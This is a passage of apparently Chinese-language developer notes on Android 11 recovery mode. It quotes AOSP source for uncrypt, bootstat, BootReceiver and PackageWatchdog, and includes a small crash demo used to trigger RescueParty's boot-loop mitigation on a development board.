mContext.enforceCallingOrSelfPermission(android.Manifest.permission.RECOVERY, null); 417 418 final boolean available = checkAndWaitForUncryptService(); 419 if (!available) { 420 Slog.e(TAG, \"uncrypt service is unavailable.\"); 421 return false; 422 } 423 424 if (isSetup) { 425 mInjector.systemPropertiesSet(\"ctl.start\", \"setup-bcb\"); 426 } else { 427 mInjector.systemPropertiesSet(\"ctl.start\", \"clear-bcb\"); 428 } 429 430 // Connect to the uncrypt service socket. 431 UncryptSocket socket = mInjector.connectService(); 432 if (socket == null) { 433 Slog.e(TAG, \"Failed to connect to uncrypt socket\"); 434 return false; 435 } 436 437 try { 438 // Send the BCB commands if it's to setup BCB. 439 if (isSetup) { 440 socket.sendCommand(command); 441 } 442 443 // Read the status from the socket. 444 int status = socket.getPercentageUncrypted(); 445 446 // Ack receipt of the status code. uncrypt waits for the ack so 447 // the socket won't be destroyed before we receive the code. 448 socket.sendAck(); 449 450 if (status == 100) { 451 Slog.i(TAG, \"uncrypt \" + (isSetup ? \"setup\" : \"clear\") 452 + \" bcb successfully finished.\"); 453 } else { 454 // Error in /system/bin/uncrypt. 455 Slog.e(TAG, \"uncrypt failed with status: \" + status); 456 return false; 457 } 458 } catch (IOException e) { 459 Slog.e(TAG, \"IOException when communicating with uncrypt:\", e); 460 return false; 461 } finally { 462 socket.close(); 463 } 464 465 return true; 466 } 61 // The socket at /dev/socket/uncrypt to communicate with uncrypt. 62 private static final String UNCRYPT_SOCKET = \"uncrypt\"; 468 /** 469 * Provides a wrapper for the low-level details of framing packets sent to the uncrypt 470 * socket. 471 */ 472 public static class UncryptSocket { 473 private LocalSocket mLocalSocket; 474 private DataInputStream mInputStream; 475 private DataOutputStream mOutputStream; 485 public boolean connectService() { 486 mLocalSocket = new LocalSocket(); 487 boolean done = false; 488 // The uncrypt socket will be created by init upon receiving the 489 // service request. It may not be ready by this point. So we will 490 // keep retrying until success or reaching timeout. 491 for (int retry = 0; retry < SOCKET_CONNECTION_MAX_RETRY; retry++) { 492 try { 493 mLocalSocket.connect(new LocalSocketAddress(UNCRYPT_SOCKET, 494 LocalSocketAddress.Namespace.RESERVED)); 495 done = true; 496 break; 522 /** 523 * Sends a command to the uncrypt service. 524 * 525 * @param command command to send to the uncrypt service 526 * @throws IOException if there was an error writing to the socket 527 */ 528 public void sendCommand(String command) throws IOException { 529 byte[] cmdUtf8 = command.getBytes(StandardCharsets.UTF_8); 530 mOutputStream.writeInt(cmdUtf8.length); 531 mOutputStream.write(cmdUtf8, 0, cmdUtf8.length); 532 } main \u51fd\u6570\u80fd\u591f\u770b\u5230 uncrypt \u5e94\u7528\u521b\u5efa\u4e86 socket , \u7b49\u5f85\u6570\u636e, \u4ecelog\u4e2d\u770b\u5230\u6570\u636e\u683c\u5f0f\u5982\u4e0b: log/log/log/tar_logcat.01/logcat.log.35:11-07 10:58:39.062 7027 7027 I uncrypt : received command: [--prompt_and_wipe_data log/log/log/tar_logcat.01/logcat.log.35-11-07 10:58:39.062 7027 7027 I uncrypt : --reason=RescueParty log/log/log/tar_logcat.01/logcat.log.35-11-07 10:58:39.062 7027 7027 I uncrypt : --locale=zh_CN log/log/log/tar_logcat.01/logcat.log.35-11-07 10:58:39.062 7027 7027 I uncrypt : ] (59) http://www.aospxref.com/android-11.0.0_r21/xref/bootable/recovery/uncrypt/uncrypt.cpp 60 * b2. create socket at 61 * /dev/socket/uncrypt 135 // UNCRYPT service still needs files on /cache partition (UNCRYPT_PATH_FILE 136 // and CACHE_BLOCK_MAP). It will be working (and needed) only for non-A/B 137 // devices, on which /cache partitions always exist. 138 static const std::string CACHE_BLOCK_MAP = \"/cache/recovery/block.map\"; 139 static const std::string UNCRYPT_PATH_FILE = \"/cache/recovery/uncrypt_file\"; 140 static const std::string UNCRYPT_STATUS = \"/cache/recovery/uncrypt_status\"; 141 static const std::string UNCRYPT_SOCKET = \"uncrypt\"; 567 static bool setup_bcb(const int socket) { 568 // c5. receive message length 569 int length; 570 if (!android::base::ReadFully(socket, &length, 4)) { 571 PLOG(ERROR) << \"failed to read the length\"; 572 return false; 573 } 574 length = ntohl(length); 575 576 // c7. receive message 577 std::string content; 578 content.resize(length); 579 if (!android::base::ReadFully(socket, &content[0], length)) { 580 PLOG(ERROR) << \"failed to read the message\"; 581 return false; 582 } 583 LOG(INFO) << \" received command: [\" << content << \"] (\" << content.size() << \")\"; 584 std::vector<std::string> options = android::base::Split(content, \"\\n\"); 585 std::string wipe_package; 586 for (auto& option : options) { 587 if (android::base::StartsWith(option, \"--wipe_package=\")) { 588 std::string path = option.substr(strlen(\"--wipe_package=\")); 589 if (!android::base::ReadFileToString(path, &wipe_package)) { 590 PLOG(ERROR) << \"failed to read \" << path; 591 return false; 592 } 593 option = android::base::StringPrintf(\"--wipe_package_size=%zu\", wipe_package.size()); 594 } 595 } 596 597 // c8. setup the bcb command 598 std::string err; 599 if (!write_bootloader_message(options, &err)) { 600 LOG(ERROR) << \"failed to set bootloader message: \" << err; 601 write_status_to_socket(-1, socket); 602 return false; 603 } 604 if (!wipe_package.empty() && !write_wipe_package(wipe_package, &err)) { 605 PLOG(ERROR) << \"failed to set wipe package: \" << err; 606 write_status_to_socket(-1, socket); 607 return false; 608 } 609 // c10. send \"100\" status 610 write_status_to_socket(100, socket); 611 return true; 612 } 613 621 int main(int argc, char** argv) { 622 enum { UNCRYPT, SETUP_BCB, CLEAR_BCB, UNCRYPT_DEBUG } action; 623 const char* input_path = nullptr; 624 const char* map_file = CACHE_BLOCK_MAP.c_str(); 625 626 if (argc == 2 && strcmp(argv[1], \"--clear-bcb\") == 0) { 627 action = CLEAR_BCB; 628 } else if (argc == 2 && strcmp(argv[1], \"--setup-bcb\") == 0) { 629 action = SETUP_BCB; 630 } else if (argc == 1) { 631 action = UNCRYPT; 632 } else if (argc == 3) { 633 input_path = argv[1]; 634 map_file = argv[2]; 635 action = UNCRYPT_DEBUG; 636 } else { 637 usage(argv[0]); 638 return 2; 639 } ... // c3. The socket is created by init when starting the service. uncrypt 659 // will use the socket to communicate with its caller. 660 android::base::unique_fd service_socket(android_get_control_socket(UNCRYPT_SOCKET.c_str())); 661 if (service_socket == -1) { 662 PLOG(ERROR) << \"failed to open socket \\\"\" << UNCRYPT_SOCKET << \"\\\"\"; 663 log_uncrypt_error_code(kUncryptSocketOpenError); 664 return 1; 665 } 666 fcntl(service_socket, F_SETFD, FD_CLOEXEC); 667 668 if (listen(service_socket, 1) == -1) { 669 PLOG(ERROR) << \"failed to listen on socket \" << service_socket.get(); 670 log_uncrypt_error_code(kUncryptSocketListenError); 671 return 1; 672 } 673 674 android::base::unique_fd socket_fd(accept4(service_socket, nullptr, nullptr, SOCK_CLOEXEC)); 675 if (socket_fd == -1) { 676 PLOG(ERROR) << \"failed to accept on socket \" << service_socket.get(); 677 log_uncrypt_error_code(kUncryptSocketAcceptError); 678 return 1; 679 } 680 681 bool success = false; 682 switch (action) { 683 case UNCRYPT: 684 success = uncrypt_wrapper(input_path, map_file, socket_fd); 685 break; 686 case SETUP_BCB: 687 success = setup_bcb(socket_fd); 688 break; 689 case CLEAR_BCB: 690 success = clear_bcb(socket_fd); 691 break; 692 default: // Should never happen. 693 LOG(ERROR) << \"Invalid uncrypt action code: \" << action; 694 return 1; 695 } 696 7 \u5c5e\u6027\u8bbe\u7f6e/\u53c2\u6570\u4f20\u9012 \u5f00\u53d1\u677f\u4e0a /system/etc/init/bootstat.rc \u5bf9\u5e94\u5982\u4e0b\u6587\u4ef6, Android\u901a\u8fc7\u4e09\u4e2a\u5c5e\u6027\u6765\u786e\u5b9a\u542f\u52a8\u539f\u56e0\u3002 - ro.boot.bootreason \uff1a\u7cfb\u7edf\u542f\u52a8\u8fc7\u7a0b\u4e2d\uff0cInit\u8fdb\u7a0b\u4f1a\u5c06\u5185\u6838\u542f\u52a8\u547d\u4ee4\u884c\u4e2d\u7684 androidboot.bootreason=<reason> \u8f6c\u5316\u4e3a ro.boot.bootreason \u3002\u542f\u52a8\u547d\u4ee4\u884c\u4e2d\u7684 bootreason \u7531\u4e00\u822c\u82af\u7247\u4f9b\u5e94\u5546\u63d0\u4f9b\uff0c\u5185\u6838\u5728\u65ad\u7535\u524d\u4f1a\u5c06\u542f\u52a8\u539f\u56e0\u5199\u5165\u4e13\u7528\u7684\u786c\u4ef6\u8d44\u6e90\u6216\u7ea6\u5b9a\u7684\u5185\u5b58\u5730\u5740\u3002\u4e0b\u6b21\u542f\u52a8\u65f6\uff0cBootloader\u5c31\u53ef\u4ee5\u8bfb\u53d6\u76f8\u5e94\u7684\u8d44\u6e90\u6765\u786e\u5b9a\u542f\u52a8\u539f\u56e0\uff0c\u7136\u540e\u6dfb\u52a0\u5230\u5185\u6838\u542f\u52a8\u547d\u4ee4\u884c\u4e2d\u3002\u5982\u679c\u82af\u7247\u4f9b\u5e94\u5546\u4e0d\u652f\u6301\u542f\u52a8\u539f\u56e0\u5199\u5165\uff0c androidboot.bootreason \u5c31\u53ef\u80fd\u4e0d\u5b58\u5728\u3002 - sys.boot.reason \uff1a\u7cfb\u7edf\u542f\u52a8\u65f6\u5148\u5c06 ro.boot.bootreason \u590d\u5236\u7ed9 sys.boot.reason \u3002\u56e0\u4e3a ro.boot.bootreason \u53ef\u80fd\u4e0d\u5b58\u5728\uff0c\u6216\u8005\u53ef\u80fd\u63d0\u4f9b\u4e0d\u51c6\u786e\u3001\u4e0d\u53ef\u89e3\u6790\u6216\u4e0d\u5408\u89c4\u8303\u7684\u4fe1\u606f\uff0c\u5728\u542f\u52a8\u5b8c\u6210\u540e\u4f1a\u8fdb\u4e00\u6b65\u66f4\u65b0 sys.boot.reason \u3002\u66f4\u65b0\u540e\u7684 sys.boot.reason \u5c06\u63d0\u4f9b\u51c6\u786e\u53ef\u9760\u7684\u3001\u7b26\u5408\u89c4\u8303\u7684\u542f\u52a8\u539f\u56e0\u3002 - persist.sys.boot.reason \uff1aAndroid\u7cfb\u7edf\u5728\u91cd\u542f\u524d\u4f1a\u5c06\u91cd\u542f\u539f\u56e0\u5199\u5165\u5230 persist.sys.boot.reason \u4e2d\u3002\u8fd9\u4e2a\u5c5e\u6027\u53ef\u4ee5\u7528\u6765\u5728 ro.boot.bootreason \u4e0d\u5b58\u5728\u65f6\uff0c\u534f\u52a9\u786e\u5b9a\u542f\u52a8\u539f\u56e0\u3002 Bootstat\u5bf9sys.boot.reason\u5904\u7406\u7684\u7b80\u5355\u6d41\u7a0b\u5982\u4e0b\uff0c - \u8bfb\u53d6ro.boot.bootreason\uff0c\u5c06\u5176\u8f6c\u5316\u4e3a\u7b26\u5408\u89c4\u8303\u7684reason\u3002 - \u5982\u679creason\u662fwatchdog\uff0c\u68c0\u67e5\u662f\u5426\u9700\u8981\u589e\u52a0security\u6807\u7b7e\u3002 - \u5982\u679creason\u662fkernel_panic\uff0c\u4ecelast klog\u4e2d\u67e5\u627e\u8be6\u7ec6\u4fe1\u606f\u3002 - \u5982\u679creason\u5c5e\u4e8e\u5f31\u96c6\uff08\u5305\u542b\u7a7a\u503c\uff09\uff0c\u4ecelast klog\u4e2d\u67e5\u627e\u4fe1\u606f\uff0c\u68c0\u67e5\u662f\u5426\u7535\u6c60\u8017\u5c3d\u5f15\u8d77\u6b7b\u673a\uff0c\u6839\u636epersist.sys.boot.reason\u4fee\u6b63reason\u3002 - \u5982\u679c\u4e0a\u8ff0\u64cd\u4f5c\u4f9d\u7136\u65e0\u6cd5\u786e\u5b9areason\uff0c\u5c06\u503c\u8bbe\u7f6e\u4e3areboot, \u3002 - \u5982\u679creason\u5c5e\u4e8e\u5185\u6838\u96c6\uff0c\u91cd\u5199persist.sys.boot.reason\u3002 http://www.aospxref.com/android-11.0.0_r21/xref/system/core/bootstat/bootstat.rc 3 # Mirror bootloader boot reason to system boot reason 4 # ro.boot.bootreason should be set by init already 5 # before post-fs trigger 6 on post-fs && property:ro.boot.bootreason=* 7 setprop sys.boot.reason ${ro.boot.bootreason} 70 # Set boot reason 71 on property:ro.persistent_properties.ready=true 72 # Converts bootloader boot reason and persist.sys.boot.reason to system boot reason 73 # Need go after persist peroperties are loaded which is right before zygote-start trigger 74 exec_background - system log -- /system/bin/bootstat --set_system_boot_reason 76 # Record boot complete metrics. 77 on property:sys.boot_completed=1 && property:sys.bootstat.first_boot_completed=0 78 # Record boot_complete and related stats (decryption, etc). 79 # Record the boot reason. 80 # Record time since factory reset. 81 # Log all boot events. 82 exec_background - system log -- /system/bin/bootstat --record_boot_complete --record_boot_reason --record_time_since_factory_reset -l 83 setprop sys.bootstat.first_boot_completed 1 http://www.aospxref.com/android-11.0.0_r21/xref/system/core/bootstat/bootstat.cpp 1059 // Is there a controlled shutdown hint in last_reboot_reason_property? 1060 if (isBluntRebootReason(ret)) { 1061 // Content buffer no longer will have console data. Beware if more 1062 // checks added below, that depend on parsing console content. 1063 if (!android::base::ReadFileToString(last_reboot_reason_file, &content)) { 1064 content = android::base::GetProperty(last_reboot_reason_property, \"\"); 1065 } 1066 transformReason(content); 1232 void SetSystemBootReason() { 1233 const auto bootloader_boot_reason = 1234 android::base::GetProperty(bootloader_reboot_reason_property, \"\"); 1235 const std::string system_boot_reason(BootReasonStrToReason(bootloader_boot_reason)); 1236 // Record the scrubbed system_boot_reason to the property 1237 BootReasonAddToHistory(system_boot_reason); 1238 // Shift last_reboot_reason_property to last_last_reboot_reason_property 1239 std::string last_boot_reason; 1240 if (!android::base::ReadFileToString(last_reboot_reason_file, &last_boot_reason)) { 1241 PLOG(ERROR) << \"Failed to read \" << last_reboot_reason_file; 1242 last_boot_reason = android::base::GetProperty(last_reboot_reason_property, \"\"); 1243 LOG(INFO) << \"Value of \" << last_reboot_reason_property << \" : \" << last_boot_reason; 1244 } else { 1245 LOG(INFO) << \"Last reboot reason read from \" << last_reboot_reason_file << \" : \" 1246 << last_boot_reason << \". Last reboot reason read from \" 1247 << last_reboot_reason_property << \" : \" 1248 << android::base::GetProperty(last_reboot_reason_property, \"\"); 1249 } 1250 if (last_boot_reason.empty() || isKernelRebootReason(system_boot_reason)) { 1251 last_boot_reason = system_boot_reason; 1252 } else { 1253 transformReason(last_boot_reason); 1254 } 1255 LOG(INFO) << \"Normalized last reboot reason : \" << last_boot_reason; 1256 android::base::SetProperty(last_last_reboot_reason_property, last_boot_reason); 1257 android::base::SetProperty(last_reboot_reason_property, \"\"); 1258 if (unlink(last_reboot_reason_file) != 0) { 1259 PLOG(ERROR) << \"Failed to unlink \" << last_reboot_reason_file; 1260 } 1261 } 8 \u5b8c\u6210\u542f\u52a8 http://www.aospxref.com/android-11.0.0_r21/xref/frameworks/base/core/res/AndroidManifest.xml 5271 5272 <receiver android:name=\"com.android.server.BootReceiver\" 5273 android:systemUserOnly=\"true\"> 5274 <intent-filter android:priority=\"1000\"> 5275 <action android:name=\"android.intent.action.BOOT_COMPLETED\" /> 5276 </intent-filter> 5277 </receiver> http://www.aospxref.com/android-11.0.0_r21/xref/frameworks/base/core/java/com/android/server/BootReceiver.java 65 public class BootReceiver extends BroadcastReceiver { 124 @Override 125 public void onReceive(final Context context, Intent intent) { 126 // Log boot events in the background to avoid blocking the main thread with I/O 127 new Thread() { 128 @Override 129 public void run() { 130 try { 131 logBootEvents(context); 198 private void logBootEvents(Context ctx) throws IOException { 199 final DropBoxManager db = (DropBoxManager) ctx.getSystemService(Context.DROPBOX_SERVICE); 200 final String headers = getBootHeadersToLogAndUpdate(); 201 final String bootReason = SystemProperties.get(\"ro.boot.bootreason\", null); 202 203 String recovery = RecoverySystem.handleAftermath(ctx); 204 if (recovery != null && db != null) { 205 db.addText(\"SYSTEM_RECOVERY_LOG\", headers + recovery); 206 } 207 208 String lastKmsgFooter = \"\"; 209 if (bootReason != null) { 210 lastKmsgFooter = new StringBuilder(512) 211 .append(\"\\n\") 212 .append(\"Boot info:\\n\") 213 .append(\"Last boot reason: \").append(bootReason).append(\"\\n\") 214 .toString(); 215 } 216 217 HashMap<String, Long> timestamps = readTimestamps(); 218 219 if (SystemProperties.getLong(\"ro.runtime.firstboot\", 0) == 0) { 220 if (StorageManager.inCryptKeeperBounce()) { 221 // Encrypted, first boot to get PIN/pattern/password so data is tmpfs 222 // Don't set ro.runtime.firstboot so that we will do this again 223 // when data is properly mounted 224 } else { 225 String now = Long.toString(System.currentTimeMillis()); 226 SystemProperties.set(\"ro.runtime.firstboot\", now); 227 } 228 if (db != null) db.addText(\"SYSTEM_BOOT\", headers); 229 230 // Negative sizes mean to take the *tail* of the file (see FileUtils.readTextFile()) 231 addLastkToDropBox(db, timestamps, headers, lastKmsgFooter, 232 \"/proc/last_kmsg\", -LASTK_LOG_SIZE, \"SYSTEM_LAST_KMSG\"); 233 addLastkToDropBox(db, timestamps, headers, lastKmsgFooter, 234 \"/sys/fs/pstore/console-ramoops\", -LASTK_LOG_SIZE, \"SYSTEM_LAST_KMSG\"); 235 addLastkToDropBox(db, timestamps, headers, lastKmsgFooter, 236 \"/sys/fs/pstore/console-ramoops-0\", -LASTK_LOG_SIZE, \"SYSTEM_LAST_KMSG\"); 237 addFileToDropBox(db, timestamps, headers, \"/cache/recovery/log\", -LOG_SIZE, 238 \"SYSTEM_RECOVERY_LOG\"); 239 addFileToDropBox(db, timestamps, headers, \"/cache/recovery/last_kmsg\", 240 -LOG_SIZE, \"SYSTEM_RECOVERY_KMSG\"); 241 addAuditErrorsToDropBox(db, timestamps, headers, -LOG_SIZE, \"SYSTEM_AUDIT\"); 242 } else { 243 if (db != null) db.addText(\"SYSTEM_RESTART\", headers); 244 } 245 // log always available fs_stat last so that logcat collecting tools can wait until 246 // fs_stat to get all file system metrics. 247 logFsShutdownTime(); 248 logFsMountTime(); 249 addFsckErrorsToDropBoxAndLogFsStat(db, timestamps, headers, -LOG_SIZE, \"SYSTEM_FSCK\"); 250 logSystemServerShutdownTimeMetrics(); 251 252 // Scan existing tombstones (in case any new ones appeared) 253 File[] tombstoneFiles = TOMBSTONE_DIR.listFiles(); 254 for (int i = 0; tombstoneFiles != null && i < tombstoneFiles.length; i++) { 255 if (tombstoneFiles[i].isFile()) { 256 addFileToDropBox(db, timestamps, headers, tombstoneFiles[i].getPath(), 257 LOG_SIZE, \"SYSTEM_TOMBSTONE\"); 258 } 259 } 260 261 writeTimestamps(timestamps); 262 263 // Start watching for new tombstone files; will record them as they occur. 264 // This gets registered with the singleton file observer thread. 265 sTombstoneObserver = new FileObserver(TOMBSTONE_DIR.getPath(), FileObserver.CREATE) { 266 @Override 267 public void onEvent(int event, String path) { 268 HashMap<String, Long> timestamps = readTimestamps(); 269 try { 270 File file = new File(TOMBSTONE_DIR, path); 271 if (file.isFile() && file.getName().startsWith(\"tombstone_\")) { 272 addFileToDropBox(db, timestamps, headers, file.getPath(), LOG_SIZE, 273 TAG_TOMBSTONE); 274 } 275 } catch (IOException e) { 276 Slog.e(TAG, \"Can't log tombstone\", e); 277 } 278 writeTimestamps(timestamps); 279 } 280 }; 281 282 sTombstoneObserver.startWatching(); 283 }","title":"\u6062\u590d\u6a21\u5f0f"},{"location":"Android/%E6%81%A2%E5%A4%8D%E6%A8%A1%E5%BC%8F/#0-demo","text":"Demo \u5e94\u8be5\u5728 1\u5206\u949f \u5185\u81f3\u5c11\u6302\u6389 5\u6b21 RescueParty \u5e94\u8be5\u5408\u5165\u4fee\u590d\u4ee3\u7801, \u5426\u5219\u4e0d\u80fd\u8fdb\u5165 recovery (\u5426\u5219 mayObservePackage \u8fd4\u56de\u5931\u8d25) Demo \u5e94\u8be5\u662f android:persistent=\"true\" \u7684, (\u5426\u5219 mayObservePackage \u8fd4\u56de\u5931\u8d25) \u4e0d\u8981\u5b58\u5728 adb \u8fde\u63a5, \u5426\u5219\u5224\u65ad\u662f\u7528\u6237\u5728\u8c03\u8bd5.( isDisabled \u5224\u65ad\u6210\u529f, \u7528\u6237\u8c03\u8bd5) Demo \u4ee3\u7801: <application ... android:name=\".CrashApp\" android:persistent=\"true\"> public class CrashApp extends Application { boolean flag = true; @Override public final void onCreate() { super.onCreate(); new Handler().postDelayed(new Runnable() { @Override public void run() { Log.e(\"==>\", \"1/0 = \" + (flag ? 1/0 : 1/1) ); } }, 100); } }","title":"0 \u7ed3\u8bba: Demo\u5e94\u8be5\u5982\u4f55\u5199"},{"location":"Android/%E6%81%A2%E5%A4%8D%E6%A8%A1%E5%BC%8F/#1-systemserver","text":"SystemServer\u4e2d, RescueParty\u6ce8\u518c\u76d1\u542c\u5668, \u5e76\u542f\u52a8PackageWatchdog, \u5982\u679c\u6bcf\u6b21 10ms \u5185 system server \u53d1\u751f\u9519\u8bef, \u8fde\u7eed\u53d1\u751f\u4e86 \u5927\u4e8e\u7b49\u4e8e5\u6b21 , \u5219\u6267\u884c executeBootLoopMitigation \u5982\u679cAPP\u53d1\u751f\u4e86\u7cdf\u7cd5\u7684\u5d29\u6e83, \u5219\u6267\u884c execute http://www.aospxref.com/android-11.0.0_r21/xref/frameworks/base/services/java/com/android/server/SystemServer.java 710 private void startBootstrapServices(@NonNull TimingsTraceAndSlog t) { 711 t.traceBegin(\"startBootstrapServices\"); ... 802 // Bring up recovery system in case a rescue party needs a reboot 803 t.traceBegin(\"StartRecoverySystemService\"); 804 mSystemServiceManager.startService(RecoverySystemService.Lifecycle.class); 805 t.traceEnd(); 806 807 // Now that we have the bare essentials of the OS up and running, take 808 // note that we just booted, which might send out a rescue party if 809 // we're stuck in a runtime restart loop. 810 RescueParty.registerHealthObserver(mSystemContext); 811 PackageWatchdog.getInstance(mSystemContext).noteBoot(); 1013 /** 1014 * Starts a miscellaneous grab bag of stuff that has yet to be refactored and organized. 1015 */ 1016 private void startOtherServices(@NonNull TimingsTraceAndSlog t) { 1017 t.traceBegin(\"startOtherServices\"); 1121 t.traceBegin(\"InstallSystemProviders\"); 1122 mActivityManagerService.installSystemProviders(); 1123 // Now that SettingsProvider is ready, reactivate SQLiteCompatibilityWalFlags 1124 SQLiteCompatibilityWalFlags.reset(); 1125 t.traceEnd(); http://www.aospxref.com/android-11.0.0_r21/xref/frameworks/base/services/core/java/com/android/server/PackageWatchdog.java 123 static final int DEFAULT_BOOT_LOOP_TRIGGER_COUNT = 5; 124 static final long DEFAULT_BOOT_LOOP_TRIGGER_WINDOW_MS = TimeUnit.MINUTES.toMillis(10); 206 PackageWatchdog(Context context, AtomicFile policyFile, Handler shortTaskHandler, 207 Handler longTaskHandler, ExplicitHealthCheckController controller, 208 ConnectivityModuleConnector connectivityModuleConnector, SystemClock clock) { 209 mContext = context; 210 mPolicyFile = policyFile; 211 mShortTaskHandler = shortTaskHandler; 212 mLongTaskHandler = longTaskHandler; 213 mHealthCheckController = controller; 214 mConnectivityModuleConnector = connectivityModuleConnector; 215 mSystemClock = clock; 216 mNumberOfNativeCrashPollsRemaining = NUMBER_OF_NATIVE_CRASH_POLLS; 217 mBootThreshold = new BootThreshold(DEFAULT_BOOT_LOOP_TRIGGER_COUNT, 218 DEFAULT_BOOT_LOOP_TRIGGER_WINDOW_MS); 219 loadFromFile(); 220 sPackageWatchdog = this; 221 } 222 442 /** 443 * Called when the system server boots. If the system server is detected to be in a boot loop, 444 * query each observer and perform the mitigation action with the lowest user impact. 445 */ 446 public void noteBoot() { 447 synchronized (mLock) { 448 if (mBootThreshold.incrementAndTest()) { 449 mBootThreshold.reset(); 450 PackageHealthObserver currentObserverToNotify = null; 451 int currentObserverImpact = Integer.MAX_VALUE; 452 for (int i = 0; i < mAllObservers.size(); i++) { 453 final ObserverInternal observer = mAllObservers.valueAt(i); 454 PackageHealthObserver registeredObserver = observer.registeredObserver; 455 if (registeredObserver != null) { 456 int impact = registeredObserver.onBootLoop(); 457 if (impact != PackageHealthObserverImpact.USER_IMPACT_NONE 458 && impact < currentObserverImpact) { 459 currentObserverToNotify = registeredObserver; 460 currentObserverImpact = impact; 461 } 462 } 463 } 464 if (currentObserverToNotify != null) { 465 currentObserverToNotify.executeBootLoopMitigation(); 466 } 467 } 468 } 469 } /** 1463 * Handles the thresholding logic for system server boots. 1464 */ 1465 static class BootThreshold { 1466 1467 private final int mBootTriggerCount; 1468 private final long mTriggerWindow; 1469 1470 BootThreshold(int bootTriggerCount, long triggerWindow) { 1471 this.mBootTriggerCount = bootTriggerCount; 1472 this.mTriggerWindow = triggerWindow; 1473 } 1498 /** Increments the boot counter, and returns whether the device is bootlooping. */ 1499 public boolean incrementAndTest() { 1500 final long now = android.os.SystemClock.elapsedRealtime(); 1501 if (now - getStart() < 0) { 1502 Slog.e(TAG, \"Window was less than zero. Resetting start to current time.\"); 1503 setStart(now); 1504 } 1505 final long window = now - getStart(); 1506 if (window >= mTriggerWindow) { 1507 setCount(1); 1508 setStart(now); 1509 return false; 1510 } else { 1511 int count = getCount() + 1; 1512 setCount(count); 1513 EventLogTags.writeRescueNote(Process.ROOT_UID, count, window); 1514 return count >= mBootTriggerCount; 1515 } 1516 }","title":"1 \u76d1\u542cSystemServer\u5d29\u6e83"},{"location":"Android/%E6%81%A2%E5%A4%8D%E6%A8%A1%E5%BC%8F/#2-app","text":"onPackagesReady \u5b8c\u6210\u52a0\u8f7d\u914d\u7f6e (updateConfigs ), \u5982\u679c\u7b26\u5408\u5224\u65ad\u6761\u4ef6, \u5219\u901a\u8fc7\u51fd\u6570 execute \u6267\u884c\u56de\u8c03\u7684\u63a5\u53e3: \u914d\u7f6e\u6587\u4ef6: spm8675p1_64:/ # cat /data/system/package-watchdog.xml <?xml version='1.0' encoding='utf-8' standalone='yes' ?> <package-watchdog version=\"1\"> <observer name=\"rescue-party-observer\" /> <observer name=\"rollback-observer\" /> </package-watchdog> 758 /** 759 * Syncs the state of the observers. 760 * 761 * <p> Prunes all observers, saves new state to disk, syncs health check requests with the 762 * health check service and schedules the next state sync. 763 */ 764 private void syncState(String reason) { 765 synchronized (mLock) { 766 Slog.i(TAG, \"Syncing state, reason: \" + reason); 767 pruneObserversLocked(); 768 769 saveToFileAsync(); 770 syncRequestsAsync(); 771 772 // Done syncing state, schedule the next state sync 773 scheduleNextSyncStateLocked(); 774 } 775 } 191 private PackageWatchdog(Context context) { 192 // Needs to be constructed inline 193 this(context, new AtomicFile( 194 new File(new File(Environment.getDataDirectory(), \"system\"), 195 \"package-watchdog.xml\")), 968 /** 969 * Persists mAllObservers to file. Threshold information is ignored. 970 */ 971 private boolean saveToFile() { 972 Slog.i(TAG, \"Saving observer state to file\"); 973 synchronized (mLock) { 974 FileOutputStream stream; 975 try { 976 stream = mPolicyFile.startWrite(); 977 } catch (IOException e) { 978 Slog.w(TAG, \"Cannot update monitored packages\", e); 979 return false; 980 } 981 982 try { 983 XmlSerializer out = new FastXmlSerializer(); ... 291 public void startObservingHealth(PackageHealthObserver observer, List<String> packageNames, 292 long durationMs) { 293 if (packageNames.isEmpty()) { 294 Slog.wtf(TAG, \"No packages to observe, \" + observer.getName()); 295 return; 296 } 297 if (durationMs < 1) { 298 Slog.wtf(TAG, \"Invalid duration \" + durationMs + \"ms for observer \" 299 + observer.getName() + \". Not observing packages \" + packageNames); 300 durationMs = DEFAULT_OBSERVING_DURATION_MS; 301 } 302 303 List<MonitoredPackage> packages = new ArrayList<>(); 304 for (int i = 0; i < packageNames.size(); i++) { 305 // Health checks not available yet so health check state will start INACTIVE 306 MonitoredPackage pkg = newMonitoredPackage(packageNames.get(i), durationMs, false); 307 if (pkg != null) { 308 packages.add(pkg); 309 } 310 } 1213 MonitoredPackage newMonitoredPackage( 1214 String name, long durationMs, boolean hasPassedHealthCheck) { 1215 return newMonitoredPackage(name, durationMs, Long.MAX_VALUE, hasPassedHealthCheck); 1216 } 1218 MonitoredPackage newMonitoredPackage(String name, long durationMs, long healthCheckDurationMs, 1219 boolean hasPassedHealthCheck) { 1220 VersionedPackage pkg = getVersionedPackage(name); 1221 if (pkg == null) { 1222 return null; 1223 } 1224 return new MonitoredPackage(pkg, durationMs, healthCheckDurationMs, hasPassedHealthCheck); 1225 } 1234 class MonitoredPackage { 1235 private final VersionedPackage mPackage; 1421 @HealthCheckState 1422 private int updateHealthCheckStateLocked() { 1423 int oldState = mHealthCheckState; 1424 if (mHasPassedHealthCheck) { 1425 // Set final state first to avoid ambiguity 1426 mHealthCheckState = HealthCheckState.PASSED; 1427 } else if (mHealthCheckDurationMs <= 0 || mDurationMs <= 0) { 1428 // Set final state first to avoid ambiguity 1429 mHealthCheckState = HealthCheckState.FAILED; 1430 } else if (mHealthCheckDurationMs == Long.MAX_VALUE) { 1431 mHealthCheckState = HealthCheckState.INACTIVE; 1432 } else { 1433 mHealthCheckState = HealthCheckState.ACTIVE; 1434 } 1435 Slog.i(TAG, \"Updated health check state for package \" + getName() + \": \" 1436 + toString(oldState) + \" -> \" + toString(mHealthCheckState)); 1437 return mHealthCheckState; 1438 } 1011 /** Dump status of every observer in mAllObservers. */ 1012 public void dump(IndentingPrintWriter pw) { 1013 pw.println(\"Package Watchdog status\"); 1014 pw.increaseIndent(); 1015 synchronized (mLock) { 1016 for (String observerName : mAllObservers.keySet()) { 1017 pw.println(\"Observer name: \" + observerName); 1018 pw.increaseIndent(); 1019 ObserverInternal observerInternal = mAllObservers.get(observerName); 1020 observerInternal.dump(pw); 1021 pw.decreaseIndent(); 1022 } 1023 } 1024 } \u5f53\u5e94\u7528\u6302\u6389\u65f6\u95f4\u95f4\u9694\u4e0d\u5927\u4e8e 1min ( mTriggerFailureDurationMs ), \u4e14\u6302\u6389\u7684\u6b21\u6570\u4e0d\u5c0f\u4e8e 5\u4e2a , \u5219 onFailureLocked \u8fd4\u56de true \u5f53 onFailureLocked \u8fd4\u56de true , \u5bf9\u76d1\u542c\u5668\u6267\u884c onHealthCheckFailed ,\u5982\u679c\u7ed3\u679c\u4e0d\u662f USER_IMPACT_NONE , 